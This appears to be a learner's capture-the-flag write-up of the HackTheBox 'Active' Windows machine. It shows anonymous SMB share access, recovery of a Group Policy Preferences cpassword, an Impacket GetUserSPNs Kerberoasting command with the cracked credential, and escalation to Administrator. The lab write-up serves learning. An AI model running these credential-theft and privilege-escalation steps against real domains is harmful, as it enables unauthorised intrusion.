
---
title: Active
desctiption: active walkthrough
---

Dificulty: Easy Window Machine

![image.png](../../../assets/ACTIVE/image.png)

### Initial state

![image.png](../../../assets/ACTIVE/image%201.png)

### Recon

**Nmap**

![image.png](../../../assets/ACTIVE/image%202.png)

![image.png](../../../assets/ACTIVE/image%203.png)

The Nmap scan reveals domain name “active.htb”. So let’s add this to our host file and start enumerating SMB service.

### Enumeration

![image.png](../../../assets/ACTIVE/image%204.png)

This is my first time using smbmap, so let's explore the SMB service. 

![image.png](../../../assets/ACTIVE/image%205.png)

There are 7 shares, and we have read access to the Replication share. Let's connect to the Replication share and see what's inside it.

![image.png](../../../assets/ACTIVE/image%206.png)

```bash
smbclient //active.htb/Replication -N
```

This command connects to the shared folder `Replication`, and `-N` connects without using a password. Now we are connected to the Replication folder. Let's explore this folder:

```bash
Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
```

While exploring the folder, there is a file called `Groups.xml`.

![image.png](../../../assets/ACTIVE/image%207.png)

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="active.htb\SVC_TGS" 
        image="2" 
        changed="2018-07-18 20:46:06" 
        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" 
                newName="" 
                fullName="" 
                description="" 
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
                changeLogon="0" 
                noChange="1" 
                neverExpires="1" 
                acctDisabled="0" 
                userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

The `Groups.xml` file contains the username `SVC_TGS` and an encrypted password (`cpassword`). This is a GPP-encrypted password.

![image.png](../../../assets/ACTIVE/image%208.png)

Let's do this!!

![image.png](../../../assets/ACTIVE/image%209.png)

Now I have the password, so let’s log in to the user shares.

![image.png](../../../assets/ACTIVE/image%2010.png)

![image.png](../../../assets/ACTIVE/image%2011.png)

### Kerberoasting

![image.png](../../../assets/ACTIVE/image%2012.png)

![image.png](../../../assets/ACTIVE/image%2013.png)

What is Kerberoasting?

![image.png](../../../assets/ACTIVE/image%2014.png)

[HTB: Active](https://0xdf.gitlab.io/2018/12/08/htb-active.html)  
[https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

I'm gonna use `GetUserSPNs.py` script from Impacket to get a list of service usernames. It will also fetch the ticket so I can crack it.

Got the session:

```bash
./GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

Result:
```bash
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-07-07 03:06:18.670972             
```

The ticket hash (Kerberos TGS ticket) is dumped. Let’s crack it using John the Ripper.

![image.png](../../../assets/ACTIVE/image%2015.png)

Found the password for Administrator! Let's login as Administrator.

![image.png](../../../assets/ACTIVE/image%2016.png)

Logged in as Administrator.

![image.png](../../../assets/ACTIVE/image%2017.png)

![image.png](../../../assets/ACTIVE/image%2018.png)

![image.png](../../../assets/ACTIVE/image%2019.png)

### Learning

After completing this machine, I learned about **Kerberoasting**, a technique that targets service accounts in Active Directory. Since **Kerberoasting** is a known attack, it made privilege escalation easier. I also spent more time working with **SMB** while dealing with Windows machines and every time I do, I gain new insights and knowledge. I feel like Windows is a little bit complicated compared to Linux since I am not very familiar with it. Capturing the root flag doesn’t feel like a privilege escalation in Windows, whereas in Linux I will be as a root user.

### Reference

- [HTB: Active](https://0xdf.gitlab.io/2018/12/08/htb-active.html)
- [HackTheBox: Active Walkthrough](https://sanaullahamankorai.medium.com/hackthebox-active-walkthrough-83b87bae691b)
- [Exploiting Kerberos for Lateral Movement & Privilege Escalation | NopSec](https://www.nopsec.com/blog/exploiting-kerberos-for-lateral-movement-and-privilege-escalation/)